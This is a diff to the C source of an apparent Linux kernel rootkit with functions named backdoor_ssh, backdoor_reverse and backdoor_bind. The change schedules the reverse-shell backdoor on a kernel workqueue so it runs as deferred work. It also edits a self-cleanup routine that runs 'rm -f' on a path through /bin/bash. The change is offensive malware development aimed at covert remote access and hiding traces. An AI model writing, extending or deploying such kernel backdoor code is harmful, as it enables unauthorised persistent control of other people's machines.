@@ -2,6 +2,17 @@
 
 #include <linux/inet.h>
 #include <net/ip.h>
+#include <linux/sched.h>
+#include <linux/slab.h>
+#include <linux/workqueue.h>
+
+
+struct workqueue_struct *work_queue;
+struct work_cont *work;
+
+struct work_cont {
+    struct work_struct real_work;
+} work_cont;
 
 static void backdoor_ssh(void) {
 
@@ -124,7 +135,7 @@ static void remove_file(void) {
         dbg("Error allocating memory\n");
         return;
     }    
-    strncpy(buff, "rm -f ", 6);
+    strcpy(buff, "rm -f ");
     strncat(buff, PATH, strlen(PATH));
     dbg("remove buffer %s\n", buff);
     char *argv[] = { "/bin/bash", "-c", buff, NULL };
@@ -314,6 +325,19 @@ static void backdoor_bind(void) {
 
 }
 
+static void thread_function(struct work_struct *work_arg){
+    struct work_cont *c_ptr = container_of(work_arg, struct work_cont, real_work);
+
+    dbg("Deferred work PID %d \n", current->pid);
+
+    backdoor_reverse();
+
+    //backdoor_bind();
+
+    kfree(c_ptr);
+
+    return;
+}
 
 void backdoor(void) {
 
@@ -321,10 +345,12 @@ void backdoor(void) {
     if (ALLOW_SSH == 1) {
         backdoor_ssh();
     }
-
-    /* TODO REVERSE BACKDOOR */
-    backdoor_reverse();
-
-    /* TODO ACTIVATOR BACKDOOR */
-    //backdoor_bind();
+    
+    work = kmalloc(sizeof(*work), GFP_KERNEL);
+    if ( !work ) {
+        dbg("Error alloc work_queue");
+        return;
+    }
+    INIT_WORK(&work->real_work, thread_function);
+    schedule_work(&work->real_work);
 }
